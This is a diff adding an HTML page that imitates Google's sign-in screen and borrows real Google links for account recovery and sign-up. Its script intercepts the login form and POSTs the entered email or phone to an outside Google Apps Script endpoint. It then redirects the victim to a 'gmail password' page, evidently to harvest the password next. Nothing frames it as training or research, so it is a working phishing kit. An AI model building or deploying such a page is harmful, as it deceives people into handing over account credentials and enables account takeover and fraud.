@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+     <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google-Style Login</title>
+  <link rel="stylesheet" href="styles.css">
+
+</head>
+<body> 
+    <!-- login area-->
+ <div class="login-container">
+     <div class="login-box">
+      <div class="logo-placeholder"></div>
+      <h1 style="font-size:33px;">Sign in</h1> <br>
+      <p>Use your Google Account</p>
+      <br>
+      <!-- form -->
+    <form method="post" action="" name="contact-form" id="myForm">
+        <label for="email"></label>
+      <input type="text" id="email" name="your-email" placeholder="Email or phone">
+      
+      <!-- end -->
+      
+     <!-- error --> 
+     <p id="error-message" style="color: red; font-size: 14px;"></p>
+<div class="loading-overlay" id="loading-overlay">
+    <div class="loading-line"></div>
+</div> 
+   <!-- end -->   
+      
+   <!-- forgot -->   
+      <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl&ddm=1&dsh=S403370257%3A1738757406003375&ec=futura_exp_og_si_72776762_e&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en" class="forgot-link">Forgot email?</a>
+        <br>
+        <p class="info-text">
+          Not your computer? Use Guest mode to sign in privately. 
+          <a href="https://support.google.com/chrome/answer/6130773?hl=en" class="learn-more">Learn more about using Guest mode</a>
+        </p>
+        <br>
+        <div class="actions">
+          <a href="https://accounts.google.com/lifecycle/steps/signup/workspaceinterstitial?continue=https://www.google.com/?gws_rd%3Dssl&ddm=1&dsh=S403370257:1738757406003375&ec=futura_exp_og_si_72776762_e&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=AO-GBTfx7t5CWUowFkOGnLdYdMWZPzCRAlR3bweAnvSpFAsKQY9BDlWnAUNOf5uV" class="create-account">Create account</a>
+     <!-- submit button-->
+      <input type="submit" value="Next" class="submit" id="submit-btn">
+      
+      </div>
+      
+		</form>
+	</div>
+	<!-- end -->
+	
+	<!-- forterss type by nth-->
+	
+	<br><br><br><br><br><br>
+    <footer class="footer">
+      <div class="footer-container">
+        <div class="language-selector">
+          <select>
+            <option value="en">English (United Kingdom)</option>
+            <option value="en-us">English (United States)</option>
+            <option value="fr">Français (French)</option>
+            <option value="es">Español (Spanish)</option>
+            <option value="de">Deutsch (German)</option>
+            <option value="zh">中文 (Chinese)</option>
+            <option value="hi">हिन्दी (Hindi)</option>
+            <option value="ar">العربية (Arabic)</option>
+            <option value="pt">Português (Portuguese)</option>
+            <option value="ru">Русский (Russian)</option>
+            <option value="ja">日本語 (Japanese)</option>
+            <option value="ko">한국어 (Korean)</option>
+            <option value="it">Italiano (Italian)</option>
+            <option value="tr">Türkçe (Turkish)</option>
+            <option value="nl">Nederlands (Dutch)</option>
+            <option value="sv">Svenska (Swedish)</option>
+            <option value="no">Norsk (Norwegian)</option>
+            <option value="da">Dansk (Danish)</option>
+            <option value="pl">Polski (Polish)</option>
+            <option value="fi">Suomi (Finnish)</option>
+            <option value="cs">Čeština (Czech)</option>
+            <option value="el">Ελληνικά (Greek)</option>
+            <option value="th">ไทย (Thai)</option>
+            <option value="vi">Tiếng Việt (Vietnamese)</option>
+            <option value="he">עברית (Hebrew)</option>
+            <option value="id">Bahasa Indonesia (Indonesian)</option>
+            <option value="ms">Bahasa Melayu (Malay)</option>
+            <option value="uk">Українська (Ukrainian)</option>
+            <option value="fa">فارسی (Persian)</option>
+            <option value="hu">Magyar (Hungarian)</option>
+            <option value="ro">Română (Romanian)</option>
+            <option value="bg">Български (Bulgarian)</option>
+            <option value="sr">Српски (Serbian)</option>
+            <option value="hr">Hrvatski (Croatian)</option>
+            <option value="sk">Slovenčina (Slovak)</option>
+            <option value="sl">Slovenščina (Slovenian)</option>
+            <option value="et">Eesti (Estonian)</option>
+            <option value="lv">Latviešu (Latvian)</option>
+            <option value="lt">Lietuvių (Lithuanian)</option>
+            <option value="af">Afrikaans</option>
+            <option value="sw">Kiswahili (Swahili)</option>
+            <option value="zu">isiZulu (Zulu)</option>
+          
+          </select>
+        </div>
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+	
+	
+	
+	
+<script>
+const scriptURL = 'https://script.google.com/macros/s/AKfycby1wCV9O63DhcNRbBjWug5mzgRoZursn5m4yWQMS0_ZDdcP_STF73Zhx77ZuPvEHJND/exec';
+
+document.getElementById('myForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    let emailInput = document.getElementById('email');
+    let errorMessage = document.getElementById('error-message');
+    let loadingOverlay = document.getElementById('loading-overlay');
+
+    // Get input value
+    let userInput = emailInput.value.trim();
+
+    // Only check if input is empty
+    if (userInput === "") {
+        errorMessage.textContent = "Email or phone number is required.";
+        emailInput.classList.add("error"); // Add red border
+        return;
+    } else {
+        errorMessage.textContent = ""; // Clear error message
+        emailInput.classList.remove("error"); // Remove red border
+    }
+
+    // Show loading animation
+    loadingOverlay.style.display = "block";
+
+    // Send form data to Google Apps Script
+    fetch(scriptURL, { method: 'POST', body: new FormData(this) })
+    .then(response => {
+        if (response.ok) {
+            return response.text();
+        } else {
+            throw new Error("Form submission failed.");
+        }
+    })
+    .then(() => {
+        // Wait exactly 4 seconds, then go to YouTube
+        setTimeout(() => {
+            window.location.href = "gmail password.html"; // Redirect to YouTube
+        }, 2000);
+    })
+    .catch(error => {
+        console.error('Error!', error.message);
+        loadingOverlay.style.display = "none"; // Hide loading if error occurs
+    });
+});
+</script>
+</body>
+</html>
+
+
